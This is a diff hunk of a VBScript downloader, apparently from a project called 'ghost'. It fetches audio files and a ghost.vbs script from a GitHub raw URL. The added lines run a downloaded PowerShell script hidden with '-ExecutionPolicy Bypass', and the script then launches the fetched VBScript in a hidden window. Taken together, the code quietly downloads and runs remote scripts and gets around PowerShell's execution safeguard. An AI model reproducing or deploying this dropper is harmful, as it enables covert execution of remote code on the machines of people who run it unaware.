@@ -13,13 +13,17 @@ call get_from_git("https://raw.githubusercontent.com/dakj0326/ghost/main/s5.mp3"
 call get_from_git("https://raw.githubusercontent.com/dakj0326/ghost/main/s6.mp3", ghostDir & "\s6.mp3", 1)
 call get_from_git("https://raw.githubusercontent.com/dakj0326/ghost/main/ghost.vbs", ghostDir & "\ghost.vbs", 2)
 
+' ===================== Run clean_vbs.ps1 =====================
+
+WScript.Sleep 2000 ' wait 2 seconds to ensure ghost.vbs has been saved
+shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ghostDir & "\clean_vbs.ps1""", 0, True
 
 ' ===================== Run ghost.vbs =========================
 
 WScript.Sleep 2000 ' wait 2 seconds to ensure ghost.vbs has been saved
 shell.Run "wscript.exe """ & ghostDir & "\ghost.vbs""", 0, False
 
-' ============================================================
+' =============================================================
 
 Sub get_from_git(url, path, t)
     Set x = CreateObject("MSXML2.XMLHTTP")
